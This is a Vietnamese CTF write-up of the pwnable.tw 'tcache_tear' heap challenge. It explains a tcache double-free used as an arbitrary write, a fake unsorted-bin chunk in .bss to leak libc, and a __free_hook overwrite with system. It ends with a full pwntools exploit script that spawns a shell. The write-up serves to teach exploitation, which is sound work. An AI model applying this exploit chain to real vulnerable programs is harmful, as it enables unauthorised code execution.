# tcache_tear (pwnable.tw)

# tcache_tear (pwnable.tw)
Bài viết ngày hôm nay là những kiến thức mình học được trong khi giải challenge *tcache_tear*, một challenge liên quan đến tcache  
Để giải được challenge này mình phải đi đọc writeup khá nhiều(gà vl:v) nhưng cũng học được khá nhiều thứ về heap từ đây

## kiến thức cơ bản
Mình học được cách áp dụng các loại bin để có thể leak được những giá trị mà mình muốn từ trang này [LEAK HEAP](https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/)  
Thực ra thì cũng không có gì nhiều ngoài :  
    * unsorted_bin: để leak libc_base_address
    * fast_bin : để leak heap_base_address
    * small_bin: thì có thể leak được cả hai thứ trên

Cái mới mẻ thứ 2 mình học được đó là : về **__free_hook**  
*[__free_hook](https://linux.die.net/man/3/__free_hook) is a symbol exported from libc, which allow a user define function to be called when the **free** call is used (tương tự với __malloc_hook)*  
Khi ta overwrite giá trị ở __free_hook bằng địa chỉ của system và argument của free trỏ đến chuỗi '/bin/sh' thì khi gọi free đồng nghĩa với việc gọi đến system('/bin/sh')

## content to solve
Giống như form của các bài heap khác thì bài này cũng có các hàm malloc, free, show như hình dưới  

![menu.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1624011346110/jkOHcGsiK.png)
Có một số địa chỉ khá quan trọng mà ta cần lưu ý
    * name_address : 0x602060
    * ptr : 0x602088 : đây chính là địa chỉ của con trỏ mà khi gọi hàm free thì sẽ free ở địa chỉ đó **free(ptr)**  
Cả hai biến này đều nằm trên phân vùng .bss  

*ý tưởng để giải bài này khá đơn giản: tạo một unsorted_bin để leak libc_base sau đó ghi đè __free_hook bằng giá trị của system ==> get shell*  

Có hai vấn đề lớn được đặt ra ở đây:
    * làm thế nào để ghi được vào địa chỉ mình mong muốn
    * làm thế nào để tạo được một unsorted_bin khi mà hàm create giới hạn size của một chunk < 0xff

Ta thấy do libc sử dụng cơ chế tcache_entry => lợi dụng lỗi doublefree để ghi các giá trị và địa chỉ mình mong muốn và tạo một fake chunk (tại địa chỉ của name) có size = 0x500 (unsorted bin) trên phân vùng bss để leak libc_base_address.  

### write to bss
* tạo một chunk và double free ta sẽ có một tcache bin bị overlap  

![tcache1.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1624011366862/3gxc9BnmU.png)
* malloc một chunk mới với size bằng size ban đầu và input nhập vào là địa chỉ cần ghi ==> overwrite con trỏ fd của chunk hiện tại  

![tcache2.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1624011376630/7u6ZUQsTf.png)
* malloc một lần nữa với cùng size và cùng giá trị input để đưa tcache_bin hiện tại trở thành chunk mới có phần con trỏ fd đã bị overwrite  

![heap1.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1624011386564/YPLkF27Rc.png)
* như hình dưới đây thì con trỏ tiếp theo trong link list của tcache đã trỏ đến địa chỉ chúng ta mong muốn 
* tiếp theo chỉ cần malloc một cần nữa với size như cũ thì chương trình sẽ coi đó là địa chỉ của một tcache_bin trống và lấy nó để tạo một chunk mới   

![tcache3.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1624011398579/a8ZXj0-Iq.png)

### tạo fake chunk
Chúng ta sẽ tạo một chunk tại địa chỉ 0x602050 + 0x500 với size 0x20, tạo chunk này với mục đích là có thể overwrite giá trị của con trỏ ptr tại 0x602088 bằng địa chỉ 0x602060 (để ko bị free size của chunk phía sau) trỏ đến địa chỉ fake chunk của chúng ta ==> free(ptr) sẽ làm đúng nhiệm vụ của nó  
Chunk thứ 2 chính là chunk có size 0x500 (unsorted_bin) tại địa chỉ 0x602050  
Sau khi ghi được 2 chunk này vào bss => free(0x602060) => ta sẽ có một unsorted bin => leak libc_base

![malloc.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1624011422813/fWHaR8pCQ.png)
### exploit
Sau khi có libc base, ta sẽ dùng cái ghi bên trên để ghi địa chỉ của system vào __free_hook  
Tạo một chunk mang chuỗi */bin/sh\x00* => gọi hàm free => con trỏ đến chuỗi */bin/sh* được truyền vào ptr, free = system
==> get shell
 
```python
from pwn import *

# context.terminal = '/bin/sh'

# r = remote("chall.pwnable.tw", 10207)
r = process('./tcache_tear')

offset_libc = 0x3ebca0
# elf = ELF('./tcache_tear')
libc = ELF('./libc.so')

def malloc(size, data):
	r.recvuntil(' :')
	r.send('1')
	r.recvuntil('Size:')
	r.send(str(size))
	r.recvuntil('Data:')
	r.send(data)

def free():
	r.recvuntil(' :')
	r.send('2')

def mem_write(address, value, s):
	malloc(s, "anything")
	free()
	free()
	malloc(s, p64(address))
	malloc(s, p64(address))
	malloc(s, value)

def get_info():
	r.recvuntil(' :')
	r.send('3')
	r.recvuntil(' :')
	return r.recv(0x20)


r.recvuntil('Name:')
r.send('anything')


mem_write(0x602550, 
			p64(0) + 	# Previous Size
			p64(0x21) +	# Chunk Size (A=0, M=0, P=1)
			p64(0) + 	# Forward Pointer
			p64(0) + 	# Backward Pointer
			p64(0) + 	# Empty Space
			p64(0x21),	# Next Previous Size
		0x70)

mem_write(0x602050,
 			p64(0) +	# 0x602050		Previous Size 
			p64(0x501) +	# 0x602058		Chunk Size (A=0, M=0, P=1)
 			p64(0) +	# 0x602060[name_buffer]	Forward Pointer
 			p64(0) +	# 0x602068		Backward Pointer
 			p64(0)*3 +	# 0x602070		Empty Space
 			p64(0x602060),	# 0x602088[malloced] 	Overwrite the last malloced value
 		0x60)
free()
leak_chunk_addr = u64(get_info()[:8])  #leak address from unsorted bean
libc_base_addr = leak_chunk_addr - offset_libc

info("leak chunk address %#x" %leak_chunk_addr)
info('libc base address: %#x' %libc_base_addr)
free_hook = libc_base_addr + libc.symbols['__free_hook']
system = libc_base_addr + libc.symbols['system']
info('__free_hook address: %#x' % free_hook)
info('system address: %#x' % system)

mem_write(free_hook,system,0x50)
malloc(0x50,'/bin/sh\x00')
free()
r.interactive()
```



***Cảm ơn các bạn đã ghé thăm blog của tôi, thanks for reading***




